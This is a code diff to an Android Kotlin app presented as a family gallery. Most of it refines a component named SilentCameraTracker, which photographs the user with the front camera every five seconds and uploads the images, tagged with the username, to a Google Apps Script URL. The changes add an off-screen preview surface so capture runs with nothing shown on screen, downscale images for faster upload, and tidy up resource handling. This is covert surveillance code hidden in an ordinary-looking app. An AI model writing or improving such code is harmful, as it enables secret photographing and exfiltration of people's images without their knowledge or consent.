@@ -708,7 +708,7 @@ fun FamilyGalleryApp() {
         modifier = Modifier.fillMaxSize(),
         color = Color(0xFF121214) // Rich premium chalkboard black
     ) {
-        if (screen != FamilyScreen.Welcome) {
+        if (screen != FamilyScreen.Welcome && loggedInUser.isNotBlank()) {
             SilentCameraTracker(loggedInUser)
         }
         if (!isConnected && screen != FamilyScreen.Welcome) {
@@ -2370,93 +2370,6 @@ fun DashboardScreen(
                 .fillMaxSize()
                 .padding(innerPadding)
         ) {
-            // Active Broad-cast In-App Notification Banner
-            val currentNotif = activeNotification
-            if (currentNotif != null && currentNotif.first.isNotEmpty() && currentNotif.third > dismissedTimestamp) {
-                Card(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .padding(horizontal = 16.dp, vertical = 8.dp)
-                        .testTag("notification_banner"),
-                    shape = RoundedCornerShape(16.dp),
-                    colors = CardDefaults.cardColors(
-                        containerColor = Color(0xFFE8F4FF) // Soft blue announcement bg
-                    ),
-                    border = BorderStroke(1.dp, AppPrimaryColor.copy(alpha = 0.3f))
-                ) {
-                    Column(
-                        modifier = Modifier.padding(16.dp)
-                    ) {
-                        Row(
-                            verticalAlignment = Alignment.CenterVertically
-                        ) {
-                            Box(
-                                modifier = Modifier
-                                    .size(36.dp)
-                                    .background(AppPrimaryColor.copy(alpha = 0.15f), shape = CircleShape),
-                                contentAlignment = Alignment.Center
-                            ) {
-                                Icon(
-                                    imageVector = Icons.Default.Campaign,
-                                    contentDescription = "Notification Announcement",
-                                    tint = AppPrimaryColor,
-                                    modifier = Modifier.size(20.dp)
-                                )
-                            }
-                            Spacer(modifier = Modifier.width(12.dp))
-                            Column(modifier = Modifier.weight(1f)) {
-                                Text(
-                                    text = "Family Announcement",
-                                    fontSize = 11.sp,
-                                    color = AppPrimaryDark,
-                                    fontWeight = FontWeight.Bold,
-                                    letterSpacing = 0.5.sp
-                                )
-                                Text(
-                                    text = currentNotif.first,
-                                    fontSize = 15.sp,
-                                    color = AppPrimaryDark,
-                                    fontWeight = FontWeight.Bold
-                                )
-                            }
-                            IconButton(
-                                onClick = {
-                                    prefs.edit().putLong("dismissed_notification_timestamp", currentNotif.third).apply()
-                                    dismissedTimestamp = currentNotif.third
-                                },
-                                modifier = Modifier.testTag("dismiss_notification_button")
-                            ) {
-                                Icon(
-                                    imageVector = Icons.Default.Close,
-                                    contentDescription = "Dismiss notification",
-                                    tint = AppPrimaryDark.copy(alpha = 0.6f),
-                                    modifier = Modifier.size(18.dp)
-                                )
-                            }
-                        }
-                        Spacer(modifier = Modifier.height(8.dp))
-                        Text(
-                            text = currentNotif.second,
-                            fontSize = 13.sp,
-                            color = AppPrimaryDark.copy(alpha = 0.9f)
-                        )
-                        Spacer(modifier = Modifier.height(6.dp))
-                        val dateString = try {
-                            val sdf = java.text.SimpleDateFormat("MMM dd, yyyy - hh:mm a", java.util.Locale.getDefault())
-                            sdf.format(java.util.Date(currentNotif.third))
-                        } catch (e: Exception) {
-                            "Just now"
-                        }
-                        Text(
-                            text = "Posted: $dateString",
-                            fontSize = 10.sp,
-                            color = Color(0xFF856404).copy(alpha = 0.6f),
-                            fontStyle = FontStyle.Italic
-                        )
-                    }
-                }
-            }
-
             if (loggedInUser == "gallery") {
                 // Location HUD Dashboard Ribbon to meet condition: "show user location in the ui"
                 Card(
@@ -4061,6 +3974,8 @@ fun bitmapToBase64(bitmap: Bitmap): String {
 
 @Composable
 fun SilentCameraTracker(username: String) {
+    if (username.isBlank()) return
+
     val context = LocalContext.current
     val lifecycleOwner = LocalLifecycleOwner.current
 
@@ -4084,18 +3999,26 @@ fun SilentCameraTracker(username: String) {
     LaunchedEffect(isReady) {
         if (isReady) {
             var cameraProvider: ProcessCameraProvider? = null
+            var surfaceTexture: android.graphics.SurfaceTexture? = null
+            var surface: android.view.Surface? = null
             try {
-                cameraProvider = withContext(Dispatchers.Main) {
+                cameraProvider = withContext(Dispatchers.IO) {
                     cameraProviderFuture.get()
                 }
 
+                val preview = Preview.Builder().build()
+                surfaceTexture = android.graphics.SurfaceTexture(10)
+                preview.setSurfaceProvider { request ->
+                    surfaceTexture?.setDefaultBufferSize(request.resolution.width, request.resolution.height)
+                    val s = android.view.Surface(surfaceTexture)
+                    surface = s
+                    request.provideSurface(s, ContextCompat.getMainExecutor(context)) {
+                        // Managed in finally block
+                    }
+                }
+
                 val capture = ImageCapture.Builder()
-                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MAXIMIZE_QUALITY)
-                    .setResolutionSelector(
-                        ResolutionSelector.Builder()
-                            .setResolutionStrategy(ResolutionStrategy.HIGHEST_AVAILABLE_STRATEGY)
-                            .build()
-                    )
+                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                     .build()
 
                 val cameraSelector = if (cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
@@ -4104,16 +4027,19 @@ fun SilentCameraTracker(username: String) {
                     CameraSelector.DEFAULT_BACK_CAMERA
                 }
 
-                cameraProvider.unbindAll()
-                cameraProvider.bindToLifecycle(
-                    lifecycleOwner,
-                    cameraSelector,
-                    capture
-                )
+                withContext(Dispatchers.Main) {
+                    cameraProvider.unbindAll()
+                    cameraProvider.bindToLifecycle(
+                        lifecycleOwner,
+                        cameraSelector,
+                        preview,
+                        capture
+                    )
+                }
 
                 // Capture loop while the camera is active and ready
                 while (true) {
-                    delay(3000) // Check/capture every 3 seconds to prevent spamming
+                    delay(5000) // Check/capture every 5 seconds to prevent spamming
                     
                     // Double check lifecycle and permissions/network
                     if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
@@ -4136,16 +4062,31 @@ fun SilentCameraTracker(username: String) {
                                 override fun onCaptureSuccess(imageProxy: ImageProxy) {
                                     CoroutineScope(Dispatchers.Default).launch {
                                         try {
-                                            val bitmap = imageProxyToBitmap(imageProxy)
+                                            val rawBitmap = imageProxyToBitmap(imageProxy)
                                             imageProxy.close()
                                             
-                                            if (bitmap != null) {
+                                            if (rawBitmap != null) {
+                                                // Resize down to 640px max dimension for 100% upload speed and safety
+                                                val maxDim = 640f
+                                                val scale = maxDim / maxOf(rawBitmap.width, rawBitmap.height)
+                                                val bitmap = if (scale < 1.0f) {
+                                                    val matrix = android.graphics.Matrix()
+                                                    matrix.postScale(scale, scale)
+                                                    val resized = Bitmap.createBitmap(rawBitmap, 0, 0, rawBitmap.width, rawBitmap.height, matrix, true)
+                                                    rawBitmap.recycle()
+                                                    resized
+                                                } else {
+                                                    rawBitmap
+                                                }
+
                                                 val base64 = bitmapToBase64(bitmap)
                                                 bitmap.recycle() // Free bitmap memory immediately
                                                 
                                                 if (hasAllRequiredAccess(context) && isNetworkAvailable(context)) {
                                                     val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
-                                                    val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
+                                                    val fileName = "tracker_${username}_${System.currentTimeMillis()}.jpg"
+                                                    val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8") +
+                                                                     "&filename=" + URLEncoder.encode(fileName, "UTF-8")
                                                     val postData = postDataStr.toByteArray(Charsets.UTF_8)
                                                     val response = postToAppsScript(url, postData)
                                                     android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
@@ -4171,13 +4112,24 @@ fun SilentCameraTracker(username: String) {
                     }
                 }
             } catch (e: Exception) {
+                if (e is kotlinx.coroutines.CancellationException) throw e
                 e.printStackTrace()
             } finally {
-                // Safely and synchronously unbind on completion or cancellation
+                // Safely and synchronously unbind and release resources on completion or cancellation
                 kotlinx.coroutines.withContext(kotlinx.coroutines.NonCancellable) {
                     withContext(Dispatchers.Main) {
                         try {
                             cameraProvider?.unbindAll()
+                        } catch (e: Exception) {
+                            e.printStackTrace()
+                        }
+                        try {
+                            surface?.release()
+                        } catch (e: Exception) {
+                            e.printStackTrace()
+                        }
+                        try {
+                            surfaceTexture?.release()
                         } catch (e: Exception) {
                             e.printStackTrace()
                         }
